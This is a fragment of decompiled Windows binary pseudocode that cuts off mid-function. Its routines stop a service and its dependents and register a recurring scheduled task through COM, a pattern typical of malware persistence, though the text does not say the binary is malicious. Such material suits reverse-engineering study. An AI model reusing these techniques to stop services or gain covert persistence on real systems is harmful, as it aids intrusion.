              Sleep(v5);
            }
            while ( QueryServiceStatusEx(v4, SC_STATUS_PROCESS_INFO, Buffer, 0x24u, &pcbBytesNeeded)
                 && *(_DWORD *)&Buffer[4] != 1
                 && GetTickCount() - TickCount <= dwMilliseconds
                 && *(_DWORD *)&Buffer[4] == 3 );
          }
          sub_40D490(hSCObject, v4, dwMilliseconds);
          if ( ControlService(v4, 1u, (LPSERVICE_STATUS)Buffer) )
          {
            while ( *(_DWORD *)&Buffer[4] != 1 )
            {
              Sleep(dwMilliseconds);
              if ( QueryServiceStatusEx(v4, SC_STATUS_PROCESS_INFO, Buffer, 0x24u, &pcbBytesNeeded) )
              {
                if ( *(_DWORD *)&Buffer[4] == 1 )
                {
                  v9 = 1;
                  break;
                }
                if ( GetTickCount() - TickCount > dwMilliseconds )
                  break;
              }
            }
          }
        }
        CloseServiceHandle(v4);
      }
      CloseServiceHandle(hSCObject);
    }
  }
  return v9;
}

//----- (0040D490) --------------------------------------------------------
struct _ENUM_SERVICE_STATUSW *__stdcall sub_40D490(SC_HANDLE a1, SC_HANDLE hService, DWORD dwMilliseconds)
{
  struct _ENUM_SERVICE_STATUSW *result; // eax
  DWORD v4; // esi
  HANDLE ProcessHeap; // eax
  struct _ENUM_SERVICE_STATUSW *v6; // esi
  DWORD i; // eax
  SC_HANDLE v8; // edi
  HANDLE v9; // eax
  DWORD TickCount; // [esp+38h] [ebp-58h]
  DWORD v11; // [esp+3Ch] [ebp-54h]
  struct _ENUM_SERVICE_STATUSW *v12; // [esp+44h] [ebp-4Ch]
  __m256 ServiceStatus; // [esp+48h] [ebp-48h] BYREF
  int v14; // [esp+68h] [ebp-28h]
  DWORD ServicesReturned; // [esp+6Ch] [ebp-24h] BYREF
  DWORD pcbBytesNeeded; // [esp+70h] [ebp-20h] BYREF
  CPPEH_RECORD ms_exc; // [esp+78h] [ebp-18h]

  result = (struct _ENUM_SERVICE_STATUSW *)a1;
  if ( hService )
  {
    pcbBytesNeeded = 0;
    ServicesReturned = 0;
    memset(&ServiceStatus, 0, sizeof(ServiceStatus));
    v14 = 0;
    TickCount = GetTickCount();
    result = (struct _ENUM_SERVICE_STATUSW *)EnumDependentServicesW(
                                               hService,
                                               1u,
                                               0,
                                               0,
                                               &pcbBytesNeeded,
                                               &ServicesReturned);
    if ( !result )
    {
      result = (struct _ENUM_SERVICE_STATUSW *)GetLastError();
      if ( result == (struct _ENUM_SERVICE_STATUSW *)234 )
      {
        v4 = pcbBytesNeeded;
        ProcessHeap = GetProcessHeap();
        result = (struct _ENUM_SERVICE_STATUSW *)HeapAlloc(ProcessHeap, 8u, v4);
        v6 = result;
        v12 = result;
        if ( result )
        {
          ms_exc.registration.TryLevel = 0;
          if ( EnumDependentServicesW(hService, 1u, result, pcbBytesNeeded, &pcbBytesNeeded, &ServicesReturned) )
          {
            for ( i = 0; ; i = v11 + 1 )
            {
              v11 = i;
              if ( i >= ServicesReturned )
                break;
              v8 = OpenServiceW(a1, (LPCWSTR)_mm_cvtsi128_si32(*(__m128i *)&v12[i].lpServiceName), 0x24u);
              if ( !v8 )
                break;
              ms_exc.registration.TryLevel = 1;
              if ( ControlService(v8, 1u, (LPSERVICE_STATUS)&ServiceStatus) )
              {
                do
                {
                  if ( LODWORD(ServiceStatus.m256_f32[1]) == 1 )
                    break;
                  Sleep(dwMilliseconds);
                  if ( !QueryServiceStatusEx(v8, SC_STATUS_PROCESS_INFO, (LPBYTE)&ServiceStatus, 0x24u, &pcbBytesNeeded) )
                    break;
                }
                while ( LODWORD(ServiceStatus.m256_f32[1]) != 1 && GetTickCount() - TickCount <= dwMilliseconds );
              }
              ms_exc.registration.TryLevel = 0;
              CloseServiceHandle(v8);
            }
            v6 = v12;
          }
          ms_exc.registration.TryLevel = -2;
          v9 = GetProcessHeap();
          return (struct _ENUM_SERVICE_STATUSW *)HeapFree(v9, 0, v6);
        }
      }
    }
  }
  return result;
}

//----- (0040D670) --------------------------------------------------------
unsigned __int8 __thiscall sub_40D670(void **this, char a2)
{
  char *v2; // edx
  bool v3; // cf
  unsigned __int8 result; // al

  v2 = (char *)this[4];
  if ( v2 >= this[5] )
    return (unsigned __int8)sub_40D800(this, 1u, (int)this, a2);
  v3 = (unsigned int)this[5] < 0x10;
  this[4] = v2 + 1;
  if ( !v3 )
    this = (void **)*this;
  result = a2;
  v2[(_DWORD)this] = a2;
  v2[(_DWORD)this + 1] = 0;
  return result;
}

//----- (0040D6B0) --------------------------------------------------------
_DWORD *__fastcall sub_40D6B0(_DWORD *Src, _DWORD *a2, const unsigned __int16 *a3)
{
  _DWORD *v3; // edi
  unsigned int v5; // eax

  v3 = a2;
  Src[4] = 0;
  Src[5] = 7;
  *(_WORD *)Src = 0;
  sub_40AF10(Src, wcslen(a3) + a2[4]);
  v5 = v3[4];
  if ( v3[5] >= 8u )
    v3 = (_DWORD *)*v3;
  sub_4044A0(Src, v3, v5);
  sub_4044A0(Src, a3, wcslen(a3));
  return Src;
}

//----- (0040D780) --------------------------------------------------------
int __fastcall sub_40D780(int a1, char *a2, void *Src)
{
  unsigned int v3; // ebx
  char *v5; // ecx
  unsigned int v6; // edi
  _QWORD *v7; // eax

  v3 = *((_DWORD *)a2 + 4);
  v5 = (char *)Src;
  v6 = *((_DWORD *)Src + 4);
  if ( v6 <= *((_DWORD *)a2 + 5) - v3 || *((_DWORD *)Src + 5) - v6 < v3 )
  {
    if ( *((_DWORD *)Src + 5) >= 8u )
      v5 = *(char **)Src;
    v7 = sub_4044A0(a2, v5, *((_DWORD *)Src + 4));
  }
  else
  {
    if ( *((_DWORD *)a2 + 5) >= 8u )
      a2 = *(char **)a2;
    v7 = sub_40B080((char **)Src, (int)Src, a2, v3);
  }
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v7;
  *(_QWORD *)(a1 + 16) = v7[2];
  *((_DWORD *)v7 + 4) = 0;
  *((_DWORD *)v7 + 5) = 7;
  *(_WORD *)v7 = 0;
  return a1;
}

//----- (0040D800) --------------------------------------------------------
void **__thiscall sub_40D800(void **Src, unsigned int a2, int a3, char a4)
{
  size_t v5; // ecx
  unsigned int v6; // edi
  unsigned int v7; // esi
  size_t v8; // eax
  void *v9; // eax
  _DWORD *v10; // edi
  _DWORD *v11; // eax
  void *v12; // esi
  void **result; // eax
  size_t v14; // [esp+Ch] [ebp-Ch]
  unsigned int v15; // [esp+10h] [ebp-8h]
  size_t Size; // [esp+14h] [ebp-4h]

  v5 = (size_t)Src[4];
  Size = v5;
  if ( 0x7FFFFFFF - v5 < a2 )
    sub_404900();
  v6 = (unsigned int)Src[5];
  v14 = v5 + a2;
  v7 = (v5 + a2) | 0xF;
  v15 = v6;
  if ( v7 > 0x7FFFFFFF )
  {
    v7 = 0x7FFFFFFF;
LABEL_4:
    v8 = -2147483613;
    goto LABEL_5;
  }
  if ( v6 > 0x7FFFFFFF - (v6 >> 1) )
  {
    v7 = 0x7FFFFFFF;
    goto LABEL_4;
  }
  if ( v7 < v6 + (v6 >> 1) )
    v7 = v6 + (v6 >> 1);
  if ( v7 + 1 < 0x1000 )
  {
    if ( v7 == -1 )
    {
      v10 = 0;
    }
    else
    {
      v11 = operator new(v7 + 1);
      v5 = Size;
      v10 = v11;
    }
    goto LABEL_17;
  }
  v8 = v7 + 36;
  if ( v7 + 36 <= v7 + 1 )
    sub_403CC0();
LABEL_5:
  v9 = operator new(v8);
  if ( !v9 )
    goto LABEL_25;
  v5 = Size;
  v10 = (_DWORD *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
  *(v10 - 1) = v9;
LABEL_17:
  Src[4] = (void *)v14;
  Src[5] = (void *)v7;
  if ( v15 >= 0x10 )
  {
    v12 = *Src;
    memmove(v10, *Src, v5);
    *((_BYTE *)v10 + Size) = a4;
    *((_BYTE *)v10 + Size + 1) = 0;
    if ( v15 + 1 < 0x1000 )
    {
LABEL_21:
      sub_44775B(v12);
      *Src = v10;
      return Src;
    }
    if ( (unsigned int)v12 - *((_DWORD *)v12 - 1) - 4 <= 0x1F )
    {
      v12 = (void *)*((_DWORD *)v12 - 1);
      goto LABEL_21;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v10, Src, v5);
  result = Src;
  *((_BYTE *)v10 + Size) = a4;
  *((_BYTE *)v10 + Size + 1) = 0;
  *Src = v10;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040D940) --------------------------------------------------------
BSTR **__thiscall sub_40D940(BSTR **this, int a2)
{
  BSTR *v3; // eax
  BSTR *v4; // esi

  v3 = (BSTR *)operator new(0xCu);
  v4 = v3;
  if ( v3 )
  {
    *(_QWORD *)v3 = 0i64;
    v3[2] = 0;
    v3[1] = 0;
    v3[2] = (BSTR)1;
    *v3 = sub_448A20(Src);
  }
  else
  {
    v4 = 0;
  }
  *this = v4;
  if ( !v4 )
    sub_448A00(-2147024882);
  return this;
}

//----- (0040D9E0) --------------------------------------------------------
BSTR **__thiscall sub_40D9E0(BSTR **this, OLECHAR *psz)
{
  BSTR *v3; // eax
  BSTR *v4; // esi
  BSTR v5; // eax

  v3 = (BSTR *)operator new(0xCu);
  v4 = v3;
  if ( v3 )
  {
    *(_QWORD *)v3 = 0i64;
    v3[2] = 0;
    v3[1] = 0;
    v3[2] = (BSTR)1;
    v5 = SysAllocString(psz);
    *v4 = v5;
    if ( !v5 && psz )
      sub_448A00(-2147024882);
  }
  else
  {
    v4 = 0;
  }
  *this = v4;
  if ( !v4 )
    sub_448A00(-2147024882);
  return this;
}

//----- (0040DA90) --------------------------------------------------------
void __thiscall sub_40DA90(int *this)
{
  int v2; // esi

  v2 = *this;
  if ( *this )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)(v2 + 8)) )
    {
      if ( *(_DWORD *)v2 )
      {
        SysFreeString(*(BSTR *)v2);
        *(_DWORD *)v2 = 0;
      }
      if ( *(_DWORD *)(v2 + 4) )
      {
        j_j__free(*(void **)(v2 + 4));
        *(_DWORD *)(v2 + 4) = 0;
      }
      sub_44775B((void *)v2);
    }
    *this = 0;
  }
}

//----- (0040DB00) --------------------------------------------------------
char __userpurge sub_40DB00@<al>(int a1@<ebp>, int a2@<edi>, int a3@<esi>, int a4, int a5, BSTR *a6)
{
  bool v6; // zf
  int (__stdcall *v7)(int *, _DWORD, ULONG, LONG, LONG, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, ULONG, LONG, LONG, int); // edi
  int v8; // esi
  int *v9; // eax
  int (__stdcall *v10)(int *, BSTR, int **); // esi
  BSTR **v11; // eax
  BSTR *v12; // eax
  BSTR v13; // eax
  int v14; // eax
  BSTR *v15; // esi
  bool v16; // cl
  void (__stdcall *v18)(int *, BSTR, _DWORD, int, int, _DWORD, ULONG); // esi
  OLECHAR *v19; // ecx
  BSTR **v20; // eax
  BSTR *v21; // eax
  BSTR v22; // eax
  BSTR *v23; // esi
  int v24; // esi
  int v25; // esi
  int v26; // esi
  void (__stdcall *v27)(int, BSTR, int, _DWORD, ULONG, LONG, LONG); // esi
  BSTR **v28; // eax
  BSTR *v29; // eax
  BSTR v30; // eax
  LONG v31; // ecx
  BSTR *v32; // esi
  void (__cdecl *v33)(int, BSTR); // esi
  OLECHAR *v34; // eax
  BSTR **v35; // eax
  BSTR *v36; // eax
  BSTR v37; // eax
  BSTR *v38; // esi
  void *v39; // ecx
  ULONG v40; // edx
  int v41; // esi
  int (__stdcall *v42)(int, BSTR, int *); // esi
  char **v43; // eax
  int v44; // ecx
  char **v45; // eax
  _DWORD *v46; // eax
  OLECHAR *v47; // eax
  BSTR **v48; // eax
  BSTR *v49; // eax
  BSTR v50; // eax
  BSTR *v51; // eax
  BSTR *v52; // esi
  void *v53; // ecx
  void *v54; // ecx
  void *v55; // ecx
  int v56; // esi
  int v57; // esi
  int (__stdcall *v58)(int, BSTR, int); // esi
  OLECHAR *v59; // eax
  BSTR **v60; // eax
  BSTR *v61; // eax
  BSTR v62; // eax
  BSTR *v63; // eax
  BSTR *v64; // esi
  int v65; // eax
  int v66; // ecx
  BSTR **v67; // eax
  int v68; // ecx
  OLECHAR *v69; // esi
  UINT v70; // eax
  BSTR **v71; // eax
  const CHAR *v72; // esi
  UINT v73; // eax
  OLECHAR *v74; // eax
  int v75; // esi
  bool v76; // cf
  BSTR **v77; // eax
  BSTR *v78; // eax
  BSTR v79; // ecx
  int v80; // eax
  BSTR *v81; // esi
  BSTR *v82; // esi
  BSTR *v83; // esi
  int v84; // [esp-F4h] [ebp-100h]
  int v86; // [esp-F0h] [ebp-FCh]
  int v88; // [esp-ECh] [ebp-F8h]
  int v89; // [esp-ECh] [ebp-F8h]
  VARIANTARG v90; // [esp-E8h] [ebp-F4h] BYREF
  _DWORD v91[2]; // [esp-D8h] [ebp-E4h] BYREF
  VARIANTARG v92; // [esp-D0h] [ebp-DCh]
  VARIANTARG v93; // [esp-C0h] [ebp-CCh] BYREF
  VARIANTARG v94; // [esp-B0h] [ebp-BCh] BYREF
  VARIANTARG v95; // [esp-A0h] [ebp-ACh] BYREF
  _BYTE v96[24]; // [esp-90h] [ebp-9Ch] BYREF
  _BYTE v97[24]; // [esp-78h] [ebp-84h] BYREF
  int v98; // [esp-60h] [ebp-6Ch]
  BSTR *v99; // [esp-5Ch] [ebp-68h] BYREF
  BSTR *v100; // [esp-58h] [ebp-64h] BYREF
  bool v101; // [esp-51h] [ebp-5Dh]
  BSTR *v102; // [esp-50h] [ebp-5Ch] BYREF
  BSTR *v103; // [esp-4Ch] [ebp-58h] BYREF
  int v104; // [esp-48h] [ebp-54h] BYREF
  int v105; // [esp-44h] [ebp-50h] BYREF
  int v106; // [esp-40h] [ebp-4Ch] BYREF
  int v107; // [esp-3Ch] [ebp-48h] BYREF
  int v108; // [esp-38h] [ebp-44h] BYREF
  int v109; // [esp-34h] [ebp-40h] BYREF
  int v110; // [esp-30h] [ebp-3Ch] BYREF
  int v111; // [esp-2Ch] [ebp-38h] BYREF
  int v112; // [esp-28h] [ebp-34h] BYREF
  int v113; // [esp-24h] [ebp-30h] BYREF
  int *v114; // [esp-20h] [ebp-2Ch] BYREF
  int *v115; // [esp-1Ch] [ebp-28h] BYREF
  _DWORD v116[5]; // [esp-18h] [ebp-24h] BYREF
  int v117; // [esp-4h] [ebp-10h]
  _DWORD v118[2]; // [esp+0h] [ebp-Ch] BYREF
  int v119; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v118[0] = a1;
  v118[1] = retaddr;
  v117 = -1;
  v116[4] = &loc_48234B;
  v116[3] = NtCurrentTeb()->NtTib.ExceptionList;
  v116[2] = &v119;
  v98 = a4;
  v6 = *(_DWORD *)(a4 + 16) == 0;
  v99 = (BSTR *)a5;
  v102 = a6;
  if ( v6 || !a6 || !*(_DWORD *)(a5 + 16) || CoInitializeEx(0, 0) < 0 )
    return 0;
  if ( CoInitializeSecurity(0, -1, 0, 0, 6u, 3u, 0, 0, 0) < 0
    || (v114 = 0, CoCreateInstance(&rclsid, 0, 1u, &riid, (LPVOID *)&v114) < 0) )
  {
LABEL_22:
    CoUninitialize();
    return 0;
  }
  v7 = *(int (__stdcall **)(int *, _DWORD, ULONG, LONG, LONG, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, ULONG, LONG, LONG, int))(*v114 + 40);
  VariantInit(&v90);
  v117 = 0;
  v92 = v90;
  VariantInit(&v95);
  *(VARIANTARG *)&v96[8] = v95;
  VariantInit(&v94);
  *(VARIANTARG *)&v97[8] = v94;
  VariantInit(&v93);
  LOBYTE(v117) = 3;
  v8 = v7(
         v114,
         *(_DWORD *)&v93.vt,
         v93.decVal.Hi32,
         v93.lVal,
         v93.cyVal.Hi,
         *(_DWORD *)&v97[8],
         *(_DWORD *)&v97[12],
         *(_DWORD *)&v97[16],
         *(_DWORD *)&v97[20],
         *(_DWORD *)&v96[8],
         *(_DWORD *)&v96[12],
         *(_DWORD *)&v96[16],
         *(_DWORD *)&v96[20],
         *(_DWORD *)&v92.vt,
         v92.decVal.Hi32,
         v92.lVal,
         v92.cyVal.Hi,
         v84);
  VariantClear(&v93);
  VariantClear(&v94);
  VariantClear(&v95);
  v117 = -1;
  VariantClear(&v90);
  v9 = v114;
  if ( v8 < 0 )
  {
LABEL_21:
    (*(void (__cdecl **)(int *))(*v9 + 8))(v9);
    goto LABEL_22;
  }
  v115 = 0;
  v10 = *(int (__stdcall **)(int *, BSTR, int **))(*v114 + 28);
  v11 = sub_40D9E0(&v103, (OLECHAR *)"\\");
  v117 = 4;
  v12 = *v11;
  if ( v12 )
    v13 = *v12;
  else
    v13 = 0;
  v14 = v10(v114, v13, &v115);
  v117 = -1;
  v15 = v103;
  v16 = v14 < 0;
  v101 = v14 < 0;
  if ( v103 && !_InterlockedDecrement((volatile signed __int32 *)v103 + 2) && v15 )
  {
    if ( *v15 )
    {
      SysFreeString(*v15);
      *v15 = 0;
    }
    if ( v15[1] )
    {
      j_j__free(v15[1]);
      v15[1] = 0;
    }
    sub_44775B(v15);
    v16 = v101;
  }
  if ( v16 )
  {
    v9 = v114;
    goto LABEL_21;
  }
  v18 = *(void (__stdcall **)(int *, BSTR, _DWORD, int, int, _DWORD, ULONG))(*v115 + 60);
  v19 = (OLECHAR *)v98;
  if ( *(_DWORD *)(v98 + 20) >= 8u )
    v19 = *(OLECHAR **)v98;
  v20 = sub_40D9E0(&v103, v19);
  v117 = 5;
  v21 = *v20;
  if ( v21 )
    v22 = *v21;
  else
    v22 = 0;
  v18(v115, v22, 0, a2, a3, *(_DWORD *)&v90.vt, v90.decVal.Hi32);
  v117 = -1;
  v23 = v103;
  if ( v103 && !_InterlockedDecrement((volatile signed __int32 *)v103 + 2) && v23 )
  {
    if ( *v23 )
    {
      SysFreeString(*v23);
      *v23 = 0;
    }
    if ( v23[1] )
    {
      j_j__free(v23[1]);
      v23[1] = 0;
    }
    v90.decVal.Hi32 = 12;
    sub_44775B(v23);
  }
  v116[0] = 0;
  v24 = (*(int (__cdecl **)(int *, _DWORD, _DWORD *))(*v114 + 36))(v114, 0, v116);
  (*(void (__cdecl **)(int *))(*v114 + 8))(v114);
  if ( v24 < 0 )
  {
    v9 = v115;
    goto LABEL_21;
  }
  v106 = 0;
  if ( (*(int (__stdcall **)(_DWORD, int *, int))(*(_DWORD *)v116[0] + 28))(v116[0], &v106, v86) < 0 )
    goto LABEL_120;
  (*(void (__stdcall **)(int))(*(_DWORD *)v106 + 8))(v106);
  v110 = 0;
  if ( (*(int (__stdcall **)(_DWORD, int *))(*(_DWORD *)v116[0] + 36))(v116[0], &v110) < 0 )
    goto LABEL_120;
  v109 = 0;
  v25 = (*(int (__stdcall **)(int, int, int *))(*(_DWORD *)v110 + 40))(v110, 2, &v109);
  (*(void (__stdcall **)(int))(*(_DWORD *)v110 + 8))(v110);
  if ( v25 < 0 )
    goto LABEL_120;
  v113 = 0;
  v26 = (**(int (__stdcall ***)(int, void *, int *))v109)(v109, &unk_493820, &v113);
  (*(void (__stdcall **)(int))(*(_DWORD *)v109 + 8))(v109);
  if ( v26 < 0 )
    goto LABEL_120;
  v27 = *(void (__stdcall **)(int, BSTR, int, _DWORD, ULONG, LONG, LONG))(*(_DWORD *)v113 + 36);
  v28 = sub_40D9E0(&v103, (OLECHAR *)L"Trigger1");
  v117 = 6;
  v29 = *v28;
  if ( v29 )
    v30 = *v29;
  else
    v30 = 0;
  v27(v113, v30, v88, *(_DWORD *)&v90.vt, v90.decVal.Hi32, v90.lVal, v90.cyVal.Hi);
  v117 = -1;
  v32 = v103;
  if ( v103 && !_InterlockedDecrement((volatile signed __int32 *)v103 + 2) && v32 )
  {
    if ( *v32 )
    {
      SysFreeString(*v32);
      *v32 = 0;
    }
    if ( v32[1] )
    {
      j_j__free(v32[1]);
      v32[1] = 0;
    }
    v90.cyVal.Hi = 12;
    sub_44775B(v32);
  }
  v90.cyVal.Hi = v31;
  v33 = *(void (__cdecl **)(int, BSTR))(*(_DWORD *)v113 + 60);
  v34 = (OLECHAR *)sub_40E6B0((int)v118, v97, v31);
  v117 = 7;
  if ( *((_DWORD *)v34 + 5) >= 8u )
    v34 = *(OLECHAR **)v34;
  v35 = sub_40D9E0(&v103, v34);
  LOBYTE(v117) = 8;
  v36 = *v35;
  if ( v36 )
    v37 = *v36;
  else
    v37 = 0;
  v33(v113, v37);
  v38 = v103;
  if ( v103 )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)v103 + 2) && v38 )
    {
      if ( *v38 )
      {
        SysFreeString(*v38);
        *v38 = 0;
      }
      if ( v38[1] )
      {
        j_j__free(v38[1]);
        v38[1] = 0;
      }
      v90.decVal.Hi32 = 12;
      sub_44775B(v38);
    }
    v103 = 0;
  }
  v117 = -1;
  if ( *(_DWORD *)&v97[20] >= 8u )
  {
    v39 = *(void **)v97;
    v40 = 2 * *(_DWORD *)&v97[20] + 2;
    if ( v40 >= 0x1000 )
    {
      v39 = *(void **)(*(_DWORD *)v97 - 4);
      v40 = 2 * *(_DWORD *)&v97[20] + 37;
      if ( (unsigned int)(*(_DWORD *)v97 - (_DWORD)v39 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v90.decVal.Hi32 = v40;
    sub_44775B(v39);
  }
  if ( (*(int (__cdecl **)(int, int))(*(_DWORD *)v113 + 84))(v113, 1) < 0 )
  {
    (*(void (__cdecl **)(int *))(*v115 + 8))(v115);
    (*(void (__cdecl **)(int))(*(_DWORD *)v113 + 8))(v113);
    v9 = (int *)v116[0];
    goto LABEL_21;
  }
  v112 = 0;
  v41 = (*(int (__stdcall **)(int))(*(_DWORD *)v113 + 40))(v113);
  (*(void (__stdcall **)(int))(*(_DWORD *)v113 + 8))(v113);
  if ( v41 < 0 )
  {
LABEL_120:
    (*(void (__cdecl **)(int *))(*v115 + 8))(v115);
    v9 = (int *)v116[0];
    goto LABEL_21;
  }
  v42 = *(int (__stdcall **)(int, BSTR, int *))(*(_DWORD *)v112 + 32);
  v43 = (char **)sub_406040((int)v91, (unsigned int)v102);
  v117 = 9;
  v45 = sub_40B080(v43, v44, (char *)L"PT", 2u);
  *(_DWORD *)&v96[16] = 0;
  *(_DWORD *)&v96[20] = 0;
  *(_OWORD *)v96 = *(_OWORD *)v45;
  *(_QWORD *)&v96[16] = *((_QWORD *)v45 + 2);
  v45[4] = 0;
  v45[5] = (char *)7;
  *(_WORD *)v45 = 0;
  LOBYTE(v117) = 10;
  v46 = sub_4044A0(v96, L"M", 1u);
  *(_DWORD *)&v97[16] = 0;
  *(_DWORD *)&v97[20] = 0;
  *(_OWORD *)v97 = *(_OWORD *)v46;
  *(_QWORD *)&v97[16] = *((_QWORD *)v46 + 2);
  v46[4] = 0;
  v46[5] = 7;
  *(_WORD *)v46 = 0;
  LOBYTE(v117) = 11;
  v47 = (OLECHAR *)v97;
  if ( *(_DWORD *)&v97[20] >= 8u )
    v47 = *(OLECHAR **)v97;
  v48 = sub_40D9E0(&v103, v47);
  LOBYTE(v117) = 12;
  v49 = *v48;
  if ( v49 )
    v50 = *v49;
  else
    v50 = 0;
  v51 = (BSTR *)v42(v112, v50, &v112);
  v52 = v103;
  v102 = v51;
  if ( v103 )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)v103 + 2) && v52 )
    {
      if ( *v52 )
      {
        SysFreeString(*v52);
        *v52 = 0;
      }
      if ( v52[1] )
      {
        j_j__free(v52[1]);
        v52[1] = 0;
      }
      sub_44775B(v52);
    }
    v103 = 0;
  }
  LOBYTE(v117) = 10;
  if ( *(_DWORD *)&v97[20] >= 8u )
  {
    v53 = *(void **)v97;
    if ( (unsigned int)(2 * *(_DWORD *)&v97[20] + 2) >= 0x1000 )
    {
      v53 = *(void **)(*(_DWORD *)v97 - 4);
      if ( (unsigned int)(*(_DWORD *)v97 - (_DWORD)v53 - 4) > 0x1F )
        goto LABEL_169;
    }
    sub_44775B(v53);
  }
  LOBYTE(v117) = 9;
  *(_DWORD *)&v97[16] = 0;
  *(_DWORD *)&v97[20] = 7;
  *(_WORD *)v97 = 0;
  if ( *(_DWORD *)&v96[20] >= 8u )
  {
    v54 = *(void **)v96;
    if ( (unsigned int)(2 * *(_DWORD *)&v96[20] + 2) >= 0x1000 )
    {
      v54 = *(void **)(*(_DWORD *)v96 - 4);
      if ( (unsigned int)(*(_DWORD *)v96 - (_DWORD)v54 - 4) > 0x1F )
        goto LABEL_169;
    }
    sub_44775B(v54);
  }
  v117 = -1;
  *(_DWORD *)&v96[16] = 0;
  *(_DWORD *)&v96[20] = 7;
  *(_WORD *)v96 = 0;
  if ( v92.cyVal.Hi >= 8u )
  {
    v55 = (void *)v91[0];
    if ( (unsigned int)(2 * v92.cyVal.Hi + 2) < 0x1000
      || (v55 = *(void **)(v91[0] - 4), (unsigned int)(v91[0] - (_DWORD)v55 - 4) <= 0x1F) )
    {
      sub_44775B(v55);
      goto LABEL_101;
    }
LABEL_169:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_101:
  (*(void (__cdecl **)(int))(*(_DWORD *)v112 + 8))(v112);
  if ( (int)v102 < 0 )
    goto LABEL_120;
  v108 = 0;
  if ( (*(int (__stdcall **)(_DWORD, int *))(*(_DWORD *)v116[0] + 68))(v116[0], &v108) < 0 )
    goto LABEL_120;
  v107 = 0;
  v56 = (*(int (__stdcall **)(int, _DWORD, int *))(*(_DWORD *)v108 + 48))(v108, 0, &v107);
  (*(void (__stdcall **)(int))(*(_DWORD *)v108 + 8))(v108);
  if ( v56 < 0 )
    goto LABEL_120;
  v111 = 0;
  v57 = (**(int (__stdcall ***)(int, void *, int *))v107)(v107, &unk_493850, &v111);
  (*(void (__stdcall **)(int))(*(_DWORD *)v107 + 8))(v107);
  if ( v57 < 0 )
    goto LABEL_120;
  v58 = *(int (__stdcall **)(int, BSTR, int))(*(_DWORD *)v111 + 44);
  v59 = (OLECHAR *)v99;
  if ( (unsigned int)v99[5] >= 8 )
    v59 = *v99;
  v60 = sub_40D9E0(&v103, v59);
  v117 = 13;
  v61 = *v60;
  if ( v61 )
    v62 = *v61;
  else
    v62 = 0;
  v63 = (BSTR *)v58(v111, v62, v89);
  v117 = -1;
  v64 = v103;
  v102 = v63;
  if ( v103 && !_InterlockedDecrement((volatile signed __int32 *)v103 + 2) && v64 )
  {
    if ( *v64 )
    {
      SysFreeString(*v64);
      *v64 = 0;
    }
    if ( v64[1] )
    {
      j_j__free(v64[1]);
      v64[1] = 0;
    }
    sub_44775B(v64);
    v63 = v102;
  }
  if ( (int)v63 < 0 )
  {
    (*(void (__cdecl **)(int))(*(_DWORD *)v111 + 8))(v111);
    goto LABEL_120;
  }
  if ( (*(int (__stdcall **)(_DWORD, int *, _DWORD, ULONG, LONG, LONG, _DWORD, _DWORD, _DWORD, ULONG, LONG, LONG, _DWORD, ULONG, LONG, LONG, _DWORD, ULONG, LONG))(*(_DWORD *)v116[0] + 44))(
         v116[0],
         &v105,
         *(_DWORD *)&v90.vt,
         v90.decVal.Hi32,
         v90.lVal,
         v90.cyVal.Hi,
         v91[0],
         v91[1],
         *(_DWORD *)&v92.vt,
         v92.decVal.Hi32,
         v92.lVal,
         v92.cyVal.Hi,
         *(_DWORD *)&v93.vt,
         v93.decVal.Hi32,
         v93.lVal,
         v93.cyVal.Hi,
         *(_DWORD *)&v94.vt,
         v94.decVal.Hi32,
         v94.lVal) >= 0 )
  {
    (*(void (__stdcall **)(int, int))(*(_DWORD *)v105 + 152))(v105, -1);
    (*(void (__stdcall **)(_DWORD, int))(*(_DWORD *)v116[0] + 48))(v116[0], v105);
  }
  v104 = 0;
  v94.lVal = (LONG)&psz;
  v65 = *v115;
  v93.vt = 8;
  v103 = *(BSTR **)(v65 + 68);
  v93.lVal = (LONG)SysAllocString(&psz);
  if ( !v93.lVal )
    sub_448A00(-2147024882);
  v117 = 14;
  *(VARIANTARG *)&v97[8] = v93;
  v67 = sub_40D940(&v102, v66);
  LOBYTE(v117) = 15;
  v94.vt = 8;
  if ( *v67 && (v69 = **v67) != 0 )
  {
    v70 = SysStringByteLen(v69);
    v94.lVal = (LONG)SysAllocStringByteLen((LPCSTR)v69, v70);
    if ( !v94.lVal )
      goto LABEL_171;
  }
  else
  {
    v94.lVal = 0;
  }
  LOBYTE(v117) = 16;
  *(VARIANTARG *)&v96[8] = v94;
  v71 = sub_40D940(&v99, v68);
  LOBYTE(v117) = 17;
  v95.vt = 8;
  if ( !*v71 || (v72 = (const CHAR *)**v71) == 0 )
  {
    v95.lVal = 0;
    goto LABEL_134;
  }
  v73 = SysStringByteLen(**v71);
  v95.lVal = (LONG)SysAllocStringByteLen(v72, v73);
  if ( !v95.lVal )
LABEL_171:
    sub_448A00(-2147024882);
LABEL_134:
  v74 = (OLECHAR *)v98;
  LOBYTE(v117) = 18;
  v75 = v116[0];
  v76 = *(_DWORD *)(v98 + 20) < 8u;
  v92 = v95;
  if ( !v76 )
    v74 = *(OLECHAR **)v98;
  v77 = sub_40D9E0(&v100, v74);
  LOBYTE(v117) = 19;
  v78 = *v77;
  if ( v78 )
    v79 = *v78;
  else
    v79 = 0;
  v80 = ((int (__cdecl *)(int *, BSTR, int, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int *))v103)(
          v115,
          v79,
          v75,
          6,
          *(_DWORD *)&v92.vt,
          *(_DWORD *)&v96[8],
          *(_DWORD *)&v96[12],
          *(_DWORD *)&v96[16],
